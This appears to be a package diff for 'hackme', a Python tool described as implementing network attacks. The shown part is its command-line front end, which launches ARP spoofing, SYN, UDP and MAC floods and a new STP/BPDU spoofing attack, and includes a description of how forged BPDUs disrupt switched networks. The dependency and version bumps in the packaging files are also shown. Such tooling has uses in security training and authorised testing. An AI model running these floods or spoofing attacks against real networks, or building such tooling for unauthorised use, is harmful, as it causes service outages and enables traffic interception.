+        all(
+            args.iface,
+            args.mac,
+            args.gwmac,
+            args.gwip,
+            args.victmac,
+            args.victip,
+        )
+        is False
+    ):
+        subparser.print_help()
+        sys.exit(1)
+    arp_spoofer.add_gateway(args.gw_mac, args.gw_ip)
+    arp_spoofer.add_victim(args.victim_mac, args.victim_ip)
     arp_spoofer.run()
 
 
+def run_flooder(subparser, args):
+    """Run SYN, UDP or MAC flood attack"""
+    match args.attack:
+        case "synflood":
+            subargs = [args.destIP, args.port, args.count]
+            flooder = SYNFlooder(*subargs)  # noqa: F405
+        case "udpflood":
+            subargs = [args.destIP, args.port, args.count]
+            flooder = UDPFlooder(*subargs)  # noqa: F405
+        case "macflood":
+            subargs = [args.iface, args.victmac, args.count]
+            flooder = MACFlooder(*subargs)  # noqa: F405
+        case _:
+            raise ValueError(f"Wrong attack name {args.attack}")
+    if args.desc:
+        print(flooder.description)
+        sys.exit(0)
+    if all(subargs) is False:
+        subparser.print_help()
+        sys.exit(1)
+    flooder.run()
+
+
+def run_stpflood(subparser, args):
+    """Run BPDU spoof attack"""
+    bpdu_packet = BPDUPacket(  # noqa: F405
+        args.iface, args.srcmac, args.dstmac, args.priority
+    )
+    if args.desc:
+        print(
+            dedent(
+                """\
+        On a Layer 2 network, switches running STP, RSTP, MSTP, or VBST
+        exchange BPDUs to calculate a spanning tree and trim the network
+        into a loop-free tree topology. If forged BPDUs are sent to attack a
+        device with edge ports and received by them, the device will
+        automatically change the edge ports to non-edge ports and recalculate
+        the spanning tree. If the bridge priority in the BPDUs sent by an
+        attacker is higher than the priority of the root bridge, the network
+        topology will change, thereby interrupting service traffic.
+        """
+            )
+        )
+        sys.exit(0)
+    if all((args.iface, args.srcmac, args.dstmac)) is False:
+        subparser.print_help()
+        sys.exit(1)
+    bpdu_packet.send_multiple_bpdu_packets()
+
+
 def main():  # pylint: disable=R0915,R0912
     """The orchestration function"""
     parser = argparse.ArgumentParser()
     parser.add_argument(
         "--debug",
         help="Enable the debug mode",
-        default=False,
-        action="store_true",
+        action="store_const",
+        dest="log_level",
+        default=logging.INFO,
+        const=logging.DEBUG,
     )
     subparser = parser.add_subparsers(
         dest="attack",
         help="Enter the attack name",
+        required=True,
     )
 
     # The ARP spofing subparser
     parser_arpspoof = subparser.add_parser(
         "arpspoof", help="The ARP spoofing attack"
     )
     parser_arpspoof.add_argument(
@@ -90,15 +161,14 @@
     )
     parser_synflood.add_argument(
         "-p", "--port", help="Destination port number"
     )
     parser_synflood.add_argument(
         "-c",
         "--count",
-        "-c",
         help="Number of packets. Default 9223372036854775807",
     )
     parser_synflood.add_argument(
         "--desc", help="Print attack description", action="store_true"
     )
 
     # The UDP flood subparser
@@ -110,15 +180,14 @@
     )
     parser_udpflood.add_argument(
         "-p", "--port", help="Destination port number"
     )
     parser_udpflood.add_argument(
         "-c",
         "--count",
-        "-c",
         help="Number of packets. Default 9223372036854775807",
     )
     parser_udpflood.add_argument(
         "--desc", help="Print attack description", action="store_true"
     )
 
     # The MAC flood subparser
@@ -141,98 +210,61 @@
         "-c",
         help="Number of packets. Default 9223372036854775807",
     )
     parser_macflood.add_argument(
         "--desc", help="Print attack description", action="store_true"
     )
 
-    args = parser.parse_args()
+    # The STP spoofing subparser
+    parser_stpspoof = subparser.add_parser(
+        "stpspoof", help="The STP spoofing attack"
+    )
+    parser_stpspoof.add_argument(
+        "-i", "--iface", help="Your network interface (i.e eth0)"
+    )
+    parser_stpspoof.add_argument(
+        "-smac", "--srcmac", help="Your interface MAC address"
+    )
+    parser_stpspoof.add_argument(
+        "-dmac", "--dstmac", help="Switch interface MAC address"
+    )
+    parser_stpspoof.add_argument(
+        "-p",
+        "--priority",
+        help="Your STP priority (less is better). Must be a multiple "
+        "of 3096. Default 8192",
+    )
+    parser_stpspoof.add_argument(
+        "--desc", help="Print attack description", action="store_true"
+    )
 
-    format_str = "%(levelname)s [ %(funcName)s() ] %(message)s"
+    args = parser.parse_args()
 
-    if args.debug:
-        logging.basicConfig(format=format_str, level=logging.DEBUG)
-    else:
-        logging.basicConfig(format=format_str, level=logging.INFO)
-
-    if args.attack is None:
-        parser.print_help()
-
-    if args.attack == "arpspoof":
-        try:
-            arp_spoofer = ARPSpoofer(args.iface, args.mac)  # noqa: F405
-            if args.desc:
-                print(arp_spoofer.description)
-                sys.exit(0)
-            if (
-                all(
-                    (
-                        args.iface,
-                        args.mac,
-                        args.gwmac,
-                        args.gwip,
-                        args.victmac,
-                        args.victip,
-                    )
-                )
-                is False
-            ):
-                parser_arpspoof.print_help()
-                sys.exit(0)
-            run_arp_spoofing(
-                arp_spoofer, args.gwmac, args.gwip, args.victmac, args.victip
-            )
-        except Exception as exc:
-            _LOGGER.error(exc, exc_info=True)
-            sys.exit(1)
-
-    elif args.attack == "synflood":
-        try:
-            syn_flooder = SYNFlooder(  # noqa: F405
-                args.destIP, args.port, args.count
-            )
-            if args.desc:
-                print(syn_flooder.description)
-                sys.exit(0)
-            if all((args.destIP, args.port)) is False:
-                parser_synflood.print_help()
-                sys.exit(0)
-            syn_flooder.run()
-        except Exception as exc:
-            _LOGGER.error("\n%s", exc, exc_info=True)
-            sys.exit(1)
-
-    elif args.attack == "udpflood":
-        try:
-            udp_flooder = UDPFlooder(  # noqa: F405
-                args.destIP, args.port, args.count
-            )
-            if args.desc:
-                print(udp_flooder.description)
-                sys.exit(0)
-            if all((args.destIP, args.port)) is False:
-                parser_udpflood.print_help()
-                sys.exit(0)
-            udp_flooder.run()
-        except Exception as exc:
-            _LOGGER.error("\n%s", exc, exc_info=True)
-            sys.exit(1)
-
-    elif args.attack == "macflood":
-        try:
-            mac_flooder = MACFlooder(  # noqa: F405
-                args.iface, args.victmac, args.count
-            )
-            if args.desc:
-                print(mac_flooder.description)
-                sys.exit(0)
-            if all((args.iface, args.victmac)) is False:
-                parser_macflood.print_help()
-                sys.exit(0)
-            mac_flooder.run()
-        except Exception as exc:
-            _LOGGER.error("\n%s", exc, exc_info=True)
-            sys.exit(1)
+    logging.basicConfig(
+        format="%(levelname)s [ %(funcName)s() ] %(message)s",
+        level=args.log_level,
+    )
+
+    attack_func_mapping = {
+        "arpspoof": run_arp_spoofing,
+        "synflood": run_flooder,
+        "udpflood": run_flooder,
+        "macflood": run_flooder,
+        "stpspoof": run_stpflood,
+    }
+    subparsers_map = {
+        "arpspoof": parser_arpspoof,
+        "synflood": parser_synflood,
+        "udpflood": parser_udpflood,
+        "macflood": parser_macflood,
+        "stpspoof": parser_stpspoof,
+    }
+
+    try:
+        attack_func_mapping[args.attack](subparsers_map[args.attack], args)
+    except Exception as exc:
+        _LOGGER.error(str(exc))
+        raise exc
 
 
 if __name__ == "__main__":
     main()
```

### Comparing `hackme-0.4.0/pyproject.toml` & `hackme-1.0.0/pyproject.toml`

 * *Files 17% similar despite different names*

```diff
@@ -1,16 +1,16 @@
 [project]
 name = "hackme"
-version = "0.4.0"
+version = "1.0.0"
 authors = [
   { name="Nadzeya Hutsko", email="nadzya.info@gmail.com" },
 ]
 description = "Scripts that implement different network attacks"
 readme = "README.md"
-dependencies = ['pylintfileheader', 'scapy']
+dependencies = ["pylintfileheader", "scapy", "wikipedia"]
 license = { text="GPL-3.0 license" }
 requires-python = ">=3.10"
 classifiers = [
     "Environment :: Console",
     "Intended Audience :: Telecommunications Industry",
     "Intended Audience :: Developers",
     "Intended Audience :: System Administrators",
```

### Comparing `hackme-0.4.0/setup.py` & `hackme-1.0.0/setup.py`

 * *Files 5% similar despite different names*

```diff
@@ -20,19 +20,23 @@
 from setuptools import setup
 
 here = os.path.abspath(os.path.dirname(__file__))
 
 with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
     long_description = "\n" + fh.read()
 
-INSTALL_REQUIRES = ["pylintfileheader", "scapy"]
+INSTALL_REQUIRES = [
+    "pylintfileheader==0.3.2",
+    "scapy==2.4.5",
+    "wikipedia==1.4.0",
+]
 
 setup(
     name="hackme",
-    version="0.4.0",
+    version="1.0.0",
     py_modules=["hackmeapp"],
     description="Scripts that implement different network attacks",
     long_description=long_description,
     long_description_content_type="text/markdown",
     packages=["hackme"],
     zip_safe=False,
     install_requires=INSTALL_REQUIRES,
```

